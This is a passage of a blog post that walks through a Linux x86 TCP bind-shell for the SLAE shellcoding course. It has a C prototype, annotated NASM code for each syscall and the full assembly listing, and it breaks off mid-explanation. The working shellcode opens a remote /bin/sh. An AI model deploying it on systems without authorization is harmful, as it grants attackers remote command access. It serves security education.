<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>SLAE Assignment 1 &#8211; rtmcx</title>
<meta name="description" content="SLAE Assignment 1 - Bind shell">
<meta name="keywords" content="asm, code, slae">



<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="SLAE Assignment 1">
<meta property="og:description" content="SLAE Assignment 1 - Bind shell">
<meta property="og:url" content="https://rtmcx.github.io/SLAE-Assignment-1/">
<meta property="og:site_name" content="rtmcx">





<link rel="canonical" href="https://rtmcx.github.io/SLAE-Assignment-1/">
<link href="https://rtmcx.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="rtmcx Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- For all browsers -->
<link rel="stylesheet" href="https://rtmcx.github.io/assets/css/main.css">
<!-- Webfonts -->
<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="https://rtmcx.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="https://rtmcx.github.io/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://rtmcx.github.io/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://rtmcx.github.io/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://rtmcx.github.io/images/apple-touch-icon-144x144-precomposed.png">



</head>

<body id="post" class="feature">

<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
	<button class="dl-trigger">Open Menu</button>
	<ul class="dl-menu">
		<li><a href="https://rtmcx.github.io/">Home</a></li>
		<li>
			<a href="#">About</a>
			<ul class="dl-submenu">
				<li>
					<img src="https://rtmcx.github.io/images/CatEye.jpg" alt="rtmcx photo" class="author-photo">
					<h4>rtmcx</h4>
					<p>Pentester. OSCP. Aspiring shellcoder and malware analyst</p>
				</li>
				<li><a href="https://rtmcx.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li>
				<li>
					<a href="mailto:rtmcx@protonmail.com"><i class="fa fa-fw fa-envelope"></i> Email</a>
				</li>
				
				
				
				
				
				
				
				
				
			</ul><!-- /.dl-submenu -->
		</li>
		<li>
			<a href="#">Posts</a>
			<ul class="dl-submenu">
				<li><a href="https://rtmcx.github.io/posts/">All Posts</a></li>
				<li><a href="https://rtmcx.github.io/tags/">All Tags</a></li>
			</ul>
		</li>
		
	    
	    <li><a href="http://www.twitter.com/rtmcx" target="_blank">Twitter</a></li>
	  
	</ul><!-- /.dl-menu -->
</nav><!-- /.dl-menuwrapper -->



<div class="entry-header">
  
  <div class="entry-image">
    <img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 1">
  </div><!-- /.entry-image -->
</div><!-- /.entry-header -->


<div id="main" role="main">
  <article class="hentry">
    <header class="header-title">
      <div class="header-title-wrap">
        
          <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-1/" rel="bookmark" title="SLAE Assignment 1">SLAE Assignment 1</a></h1>
        
        <h2><span class="entry-date date published"><time datetime="2017-03-23T00:00:00+00:00">March 23, 2017</time></span></h2>
        
        <p class="entry-reading-time">
          <i class="fa fa-clock-o"></i>
          
Reading time ~11 minutes
        </p><!-- /.entry-reading-time -->
        
      </div><!-- /.header-title-wrap -->
    </header>
    <div class="entry-content">
      <h1 id="bind-shell">Bind shell</h1>

<h2 id="requirements">Requirements</h2>

<ul>
  <li>Create a Shell_Bind_TCP  shellcode
    <ul>
      <li>Binds to a port</li>
      <li>Execs Shell on incoming connection</li>
    </ul>
  </li>
  <li>Port number should be easily conﬁgurable</li>
</ul>

<p>To better understand the task ahead and which components that are needed, I wrote a small program in C.</p>

<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
</span>
<span class="cp">#define SRVPORT 5555
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="c1">// Address information for server and client
</span>        <span class="c1">// sockaddr_in is found in 'netinet/in.h'
</span>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">host_addr</span><span class="p">,</span> <span class="n">client_addr</span><span class="p">;</span>

        <span class="c1">// Create a TCP socket, of type stream and protocol IP.
</span>        <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span> <span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>

        <span class="c1">// Set up the values for the 'Bind'-function   
</span>        <span class="n">host_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>                          
        <span class="n">host_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">SRVPORT</span><span class="p">);</span>                    <span class="c1">// Portnum 
</span>        <span class="n">host_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span>  <span class="n">htonl</span> <span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>        <span class="c1">// Bind to any IP
</span>
        <span class="c1">// Bind the socket to the host
</span>        <span class="n">bind</span> <span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">host_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">));</span>

        <span class="c1">// Start to listen on the socket..
</span>        <span class="n">listen</span> <span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

        <span class="c1">// Accept incomming request
</span>        <span class="n">socklen_t</span> <span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sin_size</span><span class="p">);</span>

        <span class="c1">// Duplicate the socket to stdin, stdout, stderr
</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// And run the shell
</span>        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
</div>
<p>Inspiration taken from “Hacking: The Art of Exploitation” by Jon Erickson and alse from http://www.umiacs.com/</p>

<p>Ok, so we have a “template” program to start mapping and converting to asm.
The tasks we need to perfom are:</p>

<ol>
  <li>Create a socket</li>
  <li>Bind</li>
  <li>Listen</li>
  <li>Accept connection</li>
  <li>Copy fd to stdio, stdout, stderr</li>
  <li>Execve</li>
</ol>

<p>So the first function to invoke is the socket()-function.</p>

<p>We start by looking up the syscall responsible for the socket creation. 
It turns out that all the socket handling is done by the syscall “socketcall”, which has syscall number 102 (or 0x66).</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
<span class="c">#define __NR_socketcall 102</span>
<span class="c">#define __NR_socket 359</span>
<span class="c">#define __NR_socketpair 360</span>
</code></pre>
</div>

<p>“man socketcall” give the following function declaration:</p>

<p>; int socketcall(int call, unsigned long *args);</p>

<p>So, to execute a socket-funktion, we need to set up the syscall and pass which socket-function to execute, and a array with the arguments to that function.</p>

<p>We find the function numbers in the “net” header file:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/linux/net.h | grep <span class="s1">'sys_socket(2)'</span> -A5
<span class="c">#define SYS_SOCKET  1       /* sys_socket(2)        */</span>
<span class="c">#define SYS_BIND    2       /* sys_bind(2)          */</span>
<span class="c">#define SYS_CONNECT 3       /* sys_connect(2)       */</span>
<span class="c">#define SYS_LISTEN  4       /* sys_listen(2)        */</span>
<span class="c">#define SYS_ACCEPT  5       /* sys_accept(2)        */</span>

</code></pre>
</div>

<h2 id="socket">Socket</h2>
<p>So to successfully execute a socket-function call we must set up the registers as the following example:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x66</span>   <span class="c">; Syscall number for socketcall</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x1</span>    <span class="c">; The socket function to execute (1 = socket) </span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; The address to an array of arguments to the function</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Make the syscall</span>
</code></pre>
</div>

<p>We use the stack for setting up the arguments for the function. 
We push the values to the stack, in reverse order, and moves the esp pointer to ecx and then make the syscall.</p>

<p>Like so:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; Create a socket using socketcall</span>
    <span class="c">; sockfd = socket(int socket_family, int socket_type, int protocol);</span>
    <span class="c">; PUSH protocol, type and domain</span>
    <span class="c">; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2</span>
    <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>    <span class="c">; Make edi null</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; Protocol', TCP = 0</span>
    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x01</span>  <span class="c">; 'Type', SOCK_STREAM = 1</span>
    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x02</span>  <span class="c">; 'Domain', INET = 2.</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx (this is the args to socketcall)</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Make the syscall </span>
    <span class="k">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>   <span class="c">; Save socketfd in esi (as we need it later on)</span>
</code></pre>
</div>
<p>ecx now contains the args-array needed for ‘Socket’-to be called successfully.</p>

<p>After the syscall has executed, the socket descriptor is then returned in eax, we save that to ‘esi’ so that we can reference it later.</p>

<h2 id="bind">Bind</h2>
<p>Next call needed is the ‘Bind’-call.</p>

<p>All code is commented and it should be fairly easy to understand what the code does and what steps that are necessary.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>   <span class="c">; BIND</span>
    <span class="c">; Set up args for 'Bind'</span>
    <span class="c">;   int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
    
    <span class="c">; ebx = socketfd (esi)</span>
    <span class="c">; ecx = args for bind (struct sockaddr) </span>
    <span class="c">; edx length of the args</span>
    
    <span class="c">; Setup the sockaddr, push the values to the stack</span>
    <span class="c">; sockaddr (2, 9999, 0)</span>
    <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0    (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x0f27</span><span class="c">; Port 9999 in hex network byte order ()</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call  </span>
    
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; inc ebx to 2, for 'Bind'-socketcall number</span>
    <span class="k">push</span> <span class="mh">0x10</span>       <span class="c">; Size of the sockaddr struct (16 bytes)</span>
    <span class="k">push</span> <span class="n">ecx</span>        <span class="c">; Argv for bind</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Bind'-args in ecx</span>
    
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; zero out eax </span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
</code></pre>
</div>

<h2 id="listen">Listen</h2>
<p>Next call needed is the ‘Listen’-call.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; LISTEN</span>
    <span class="c">; Setup args for 'Listen' </span>
    <span class="c">; listen(socketfd, backlog)</span>

    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Make eax null</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>
    
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Listen'-args</span>
    <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x4</span>     <span class="c">; Syscall for listen</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>


</code></pre>
</div>

<h2 id="accept">Accept</h2>
<p>Next call needed is the ‘Accept’-call.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; ACCEPT</span>
    <span class="c">; Setup args for 'Accept'</span>
    <span class="c">; accept( socketfd, struct sockaddr, sizeof sockaddr)</span>
    <span class="c">; Since we know nothing of the client, sockaddr and it's size is set to 0   </span>
    
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0 (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; </span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>

    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; struct for sockaddr (client)</span>
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; ebx has 4 since 'listen' call. Inc to make 5 for accept</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>

</code></pre>
</div>
<h2 id="dup2">dup2</h2>
<p>Next we need to perform the “dup2”-syscall to redirect the incoming traffic to stdin, stdout and stderr.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; DUP2</span>
    <span class="c">; Now we need to dup2 i/o-to client socketfd</span>
    <span class="c">; dup2(oldfd, newfd)</span>
    
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; put client socketfd (returned in eax) to ebx</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; make eax zero</span>
    
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Zero out ecx</span>
    <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x03</span>    <span class="c">; Start value for counter</span>
<span class="n">dup2</span><span class="o">:</span>
    <span class="k">dec</span> <span class="n">ecx</span>         <span class="c">; decrese ecx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>    <span class="c">; syscall for dup2</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
    <span class="k">jnz</span> <span class="n">dup2</span>        <span class="c">; If ecx i not zero, next iteration</span>
</code></pre>
</div>

<h2 id="execve">Execve</h2>
<p>Finally, we execute the “Execve”-syscall</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; EXECVE</span>
    <span class="c">; Setup execve</span>
    <span class="c">; execve ("/bin/sh", NULL, NULL)</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Zero eax</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0 used as a terminator</span>
    <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">; hs/n in hex</span>
    <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">; ib//  in hex</span>

    <span class="c">; Set up ebx for syscall</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put address to //bin/sh0x0 in ebx</span>
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Put a zero in ecx</span>
    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; Put a zero in edx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>     <span class="c">; Syscall for execve</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
</code></pre>
</div>

<p>The full code is as follows:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; Bind shell in nasm</span>
<span class="c">; Author: rtmcx</span>
<span class="c">; </span>

<span class="kr">global</span> <span class="n">_start</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>

<span class="c">; The following actions must be performed:</span>
<span class="c">; Create a socket</span>
<span class="c">; Bind the socket</span>
<span class="c">; Listen for connection</span>
<span class="c">; Accept a connection</span>
<span class="c">; Copy socket to stdio, stdout, stderr</span>
<span class="c">; Execve /bin/sh</span>

<span class="c">; Socket functions are used by the socketcall syscall</span>
<span class="c">; int socketcall(int call, unsigned long *args);</span>

<span class="c">; socketcall = 102 (0x66) </span>
<span class="c">; /usr/include/linux/net.h </span>
<span class="c">; Socket =1     </span>
<span class="c">; Bind = 2</span>
<span class="c">; Listen = 4</span>
<span class="c">; Accept = 5             </span>


    <span class="c">; Create a socket using socketcall</span>
    <span class="c">; sockfd = socket(int socket_family, int socket_type, int protocol);</span>
    <span class="c">; eax = 0x66    (socketcall syscall)</span>
    <span class="c">; ebx = 1 (Bind) </span>
    <span class="c">; ecx = args for bind</span>
<span class="c">; SOCKET    </span>
    <span class="k">push</span> <span class="mh">0x66</span>       <span class="c">; Syscall for socketcall</span>
    <span class="k">pop</span> <span class="n">eax</span>         <span class="c">; in eax</span>

    <span class="k">push</span> <span class="mh">0x1</span>        <span class="c">; Socketcall-number for socket</span>
    <span class="k">pop</span> <span class="n">ebx</span>         <span class="c">; Put in ebx</span>
        
    <span class="c">; Set up the args for socket</span>
    <span class="c">; cat /usr/include/linux/in.h </span>
    <span class="c">; PUSH protocol, type and domain</span>
    <span class="c">; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2</span>
    <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>    <span class="c">; Make edi null</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; This is 'Protocol' TCP = 0</span>
    <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; ebx already has 1 in it, reuse for Type</span>
    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x8002</span><span class="c">; Inet = 2.</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put 'pointer' to args in ecx (args to socketcall)</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; execute syscall. </span>

    <span class="c">; Now we have a socketfd in eax</span>
    <span class="k">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>   <span class="c">; Save socketfd in esi (as we need it later on)</span>


<span class="c">; BIND</span>
    <span class="c">; Set up args for 'Bind'</span>
    <span class="c">;   int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
    
    <span class="c">; ebx = socketfd (esi)</span>
    <span class="c">; ecx = args for bind (struct sockaddr) </span>
    <span class="c">; edx length of the args</span>
    
    <span class="c">; Setup the sockaddr, push the values to the stack</span>
    <span class="c">; sockaddr (2, 9999, 0)</span>
    <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0    (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x0f27</span><span class="c">; Port 9999 in hex network byte order (0x0f27)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call  </span>
    
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; inc ebx to 2, for 'Bind'-socketcall number</span>
    <span class="k">push</span> <span class="mh">0x10</span>       <span class="c">; Size of the sockaddr struct (16 bytes)</span>
    <span class="k">push</span> <span class="n">ecx</span>        <span class="c">; Argv for bind</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Bind'-args in ecx</span>
    
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; zero out eax </span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>

    
<span class="c">; LISTEN</span>
    <span class="c">; Setup args for 'Listen' </span>
    <span class="c">; listen(socketfd, backlog)</span>

    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Make eax null</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>
    
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Listen'-args</span>
    <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x4</span>     <span class="c">; Syscall for listen</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>


<span class="c">; ACCEPT</span>
    <span class="c">; Setup args for 'Accept'</span>
    <span class="c">; accept( socketfd, struct sockaddr, sizeof sockaddr)</span>
    <span class="c">; Since we know nothing of the client, sockaddr and it's size is set to 0   </span>
    
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0 (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; </span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>

    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; struct for sockaddr (client)</span>
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; ebx has 4 since 'listen' call. Inc to make 5 for accept</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>


<span class="c">; DUP2</span>
    <span class="c">; Now we need to dup2 i/o-to client socketfd</span>
    <span class="c">; dup2(oldfd, newfd)</span>
    
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; put client socketfd (returned in eax) to ebx</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; make eax zero</span>
    
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Zero out ecx</span>
    <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x03</span>    <span class="c">; Start value for counter</span>
<span class="n">dup2</span><span class="o">:</span>
    <span class="k">dec</span> <span class="n">ecx</span>         <span class="c">; decrese ecx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>    <span class="c">; syscall for dup2</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
    <span class="k">jnz</span> <span class="n">dup2</span>        <span class="c">; If ecx i not zero, next iteration</span>


<span class="c">; EXECVE</span>
    <span class="c">; Setup execve</span>
    <span class="c">; execve ("/bin/sh", NULL, NULL)</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Zero eax</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0 used as a terminator</span>
    <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">; hs/n in hex</span>
    <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">; ib//  in hex</span>

    <span class="c">; Set up ebx for syscall</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put address to //bin/sh0x0 in ebx</span>
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Put a zero in ecx</span>
    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; Put a zero in edx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>     <span class="c">; Syscall for execve</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
</code></pre>
</div>

<p>Compile and link the program:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>
rtmcx@parrot <span class="nv">$ </span>nasm -f elf32 <span class="nb">bind</span>-shell.nasm -o <span class="nb">bind</span>-shell.o
rtmcx@parrot <span class="nv">$ </span>ld -m elf_i386 <span class="nb">bind</span>-shell.o -o <span class="nb">bind</span>-shell
</code></pre>
</div>

<p>To avoid doing this every time, I extended the script that Vivek wrote in the course. The script compiles, links, extracts the shellcode, create a shellcode c-program generator and compiles it.</p>

<p>The script can be found in the Github-repo for the SLAE assignments: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<h2 id="replace-port-number">Replace port number</h2>
<p>After the bind-shell is complete, next up is to complete the requirrement “Port number should be easily conﬁgurable”.
The easiest way to change the port number is using a script that takes a port number, converts it into hex and reverse the byte order.
The portnumber bytes is then replaced in the shellcode.</p>

<p>Instead of creating a new, separate script to performs these tasks, I decided to include them into the compiler script. 
The port number is then feed into the script as an commandline argument:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./compile.sh <span class="nb">bind</span>-shell 1337
<span class="o">[</span><span class="k">***</span><span class="o">]</span> Compiling with nasm...
<span class="o">[</span><span class="k">***</span><span class="o">]</span> Linking with ld...
<span class="o">[</span>---] Replacing the port to 1337
</code></pre>
</div>

<p>To be able to do this dynamicly, we need to replace the port number-push in the shellcode with “marker bytes”, so that we can find the correct place in the shellcode. 
this is done in the ‘Bind’-call:</p>

